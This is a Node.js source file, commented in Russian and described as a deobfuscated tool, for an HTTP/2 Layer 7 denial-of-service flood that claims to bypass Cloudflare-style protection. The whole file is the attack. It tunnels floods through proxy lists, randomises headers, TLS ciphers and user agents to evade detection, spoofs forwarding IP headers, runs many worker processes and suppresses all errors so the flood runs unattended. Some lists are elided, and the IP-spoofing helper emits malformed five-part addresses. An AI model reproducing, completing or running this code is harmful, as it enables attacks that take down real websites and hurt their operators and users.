// Custom-Bypass.js - деобфусцированная версия
// Это инструмент для HTTP/2 флуда (DDoS Layer 7) с байпасом защит (Cloudflare и т.п.)

const url = require('url');
const fs = require('fs');
const http2 = require('http2');
const http = require('http');
const tls = require('tls');
const net = require('net');
const cluster = require('cluster');
const colors = require('colors');

// Списки для рандомизации заголовков и параметров
const cplist = [
    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA",
    "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
    // ... (много других комбинаций cipher suites)
];

const accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    // ... разные Accept заголовки
];

const lang_header = [
    "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
    "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
    // ... языки
];

const encoding_header = [
    "deflate, gzip, br",
    "gzip",
    "deflate",
    "br",
];

const control_header = [
    "no-cache",
    "max-age=0",
];

const pathts = ["?s=", "/?", "", "?q=", "?true=", "?"];
const querys = ["", "&", "&&", "and", "=", "+"];
const refers = [
    "https://www.google.com",
    "https://check-host.net",
    "https://www.facebook.com",
    "https://google.com",
    "https://youtube.com",
    "https://facebook.com",
];

const browsers = ["Microsoft Edge", "Google Chrome", "Firefox", "Safari", "Opera", ...];
const sechuas = ["Android", "Chrome OS", "Chromium OS", "iOS", "Linux", "macOS", ...];

// Игнорируемые ошибки и коды (чтобы скрипт не падал)
const ignoreNames = ["RequestError", "StatusCodeError", "CaptchaError", "CloudflareError", "ParseError", "ParserError", "SELF_SIGNED_CERT_IN_CHAIN", ...];
const ignoreCodes = ['ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];

// Отключаем предупреждения и необработанные ошибки
process.setMaxListeners(0);
process.on('warning', () => {});
process.on('unhandledRejection', () => {});
process.on('uncaughtException', () => {});

// Функции рандомизации
function accept() { return accept_header[Math.floor(Math.random() * accept_header.length)]; }
function lang() { return lang_header[Math.floor(Math.random() * lang_header.length)]; }
function refer() { return refers[Math.floor(Math.random() * refers.length)]; }
function encoding() { return encoding_header[Math.floor(Math.random() * encoding_header.length)]; }
function controling() { return control_header[Math.floor(Math.random() * control_header.length)]; }
function cipher() { return cplist[Math.floor(Math.random() * cplist.length)]; }
function randpath() { return pathts[Math.floor(Math.random() * pathts.length)]; }
function query() { return querys[Math.floor(Math.random() * querys.length)]; }
function browser() { return browsers[Math.floor(Math.random() * browsers.length)]; }
function sechua() { return sechuas[Math.floor(Math.random() * sechuas.length)]; }

// Подмена IP
function ip_spoof() {
    const rand = () => Math.floor(Math.random() * 255);
    return `1.${rand()}.${rand()}.${rand()}.1`;
}

// Генерация случайной строки
function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

// Проверка аргументов
if (process.argv.length < 8) {
    console.log("\n\tHTTP/2 Flood By Telephone".bold.green);
    console.log("\tUsage: node file_name <GET/HEAD/POST> <host> <proxies> <duration> <rate> <thread>".bold.green);
    console.log("\n");
    process.exit(0);
}

const rate = process.argv[6];           // Количество запросов в секунду на соединение
const method = process.argv[2].toUpperCase();
const proxies = fs.readFileSync(process.argv[4], 'utf-8').replace(/\r/g, '').split('\n');
const userAgents = fs.readFileSync("ua.txt", 'utf-8').replace(/\r/g, '').split('\n');

// Запуск в кластере
if (cluster.isMaster) {
    for (let i = 0; i < process.argv[7]; i++) {
        cluster.fork();
    }
    console.log("HTTP/2 Flood by Telephone".red);
    setTimeout(() => {
        console.log("Attack ended.".red);
        process.exit(-1);
    }, process.argv[5] * 1000);
} else {
    // Основная функция флуда
    function flood() {
        const parsed = url.parse(process.argv[3]);
        const uagent = userAgents[Math.floor(Math.random() * userAgents.length)];
        const spoofed_ip = ip_spoof();
        const query_str = query();
        const referer = refer();
        const tls_cipher = cipher();
        const proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');

        // Заголовки запроса
        const headers = {
            ":method": method,
            ":path": parsed.path + randpath() + randstr(15) + query_str + randstr(15),
            ":scheme": "https",
            "Origin": parsed.host,
            "Accept": accept(),
            "Accept-encoding": encoding(),
            "Accept-Language": lang(),
            "Cache-Control": controling(),
            "DNT": "1",
            "Sec-ch-ua": browser() + ';v="105",Not;A Brand;v="99",Chromium;v="105"',
            "sec-ch-ua-platform": sechua(),
            "X-Frame-Options": "DENY",
            "X-Content-Type-Options": "nosniff",
            "X-XSS-Protection": "1; mode=block",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "sec-fetch-user": "?1",
            "sec-gpc": "1",
            "TE": "trailers",
            "Pragma": "no-cache",
            "Upgrade-Insecure-Requests": "1",
            "X-Forwarded-Proto": "https",
            "X-Forwarded-For": spoofed_ip,
            "X-Forwarded-Host": spoofed_ip,
            "Via": spoofed_ip,
            "Client-IP": spoofed_ip,
            "Real-IP": spoofed_ip,
            "Referer": referer,
            "User-Agent": uagent
        };

        // HTTP/1.1 соединение через прокси для туннеля
        const agent = new http.Agent({ keepAlive: true, keepAliveMsecs: 50000, maxSockets: 128 });

        const req = http.request({
            host: proxy[0],
            agent: agent,
            globalAgent: agent,
            port: proxy[1],
            timeout: 10000,
            ciphers: tls_cipher,
            headers: {
                'Host': parsed.host,
                'Proxy-Connection': 'Keep-Alive',
                'Connection': 'Keep-Alive'
            },
            method: 'CONNECT',
            path: parsed.host + ':443'
        }, () => {});

        req.on('connect', (res, socket) => {
            // После CONNECT создаём HTTP/2 сессию через TLS
            const session = http2.connect(parsed.href, {
                createConnection: () => tls.connect({
                    host: parsed.host,
                    ciphers: tls.getCiphers() + ':' + tls_cipher,
                    secureProtocol: 'TLS_method',
                    servername: parsed.host,
                    curve: 'GREASE:X25519:x25519',
                    clientTimeout: 5000,
                    clientmaxTimeout: 10000,
                    challengesToSolve: 10,
                    resolveWithFullResponse: true,
                    HonorCipherOrder: true,
                    Compression: false,
                    UseStapling: true,
                    SessionTickets: false,
                    requestCert: true,
                    gzip: true,
                    port: 443,
                    sigals: 'rsa_pss_rsae_sha256',
                    strictSSL: false,
                    secure: true,
                    rejectUnauthorized: false,
                    ALPNProtocols: ['h2'],
                    socket: socket
                })
            });

            // Отправляем rate запросов
            for (let i = 0; i < rate; i++) {
                const h2req = session.request(headers);
                h2req.setEncoding('utf8');
                h2req.on('data', () => {});  // игнорируем ответ
                h2req.on('end', () => { h2req.close(); });
                h2req.end();
            }
        });

        req.end();
    }

    // Запуск флуда
    setInterval(() => { flood(); });
         }
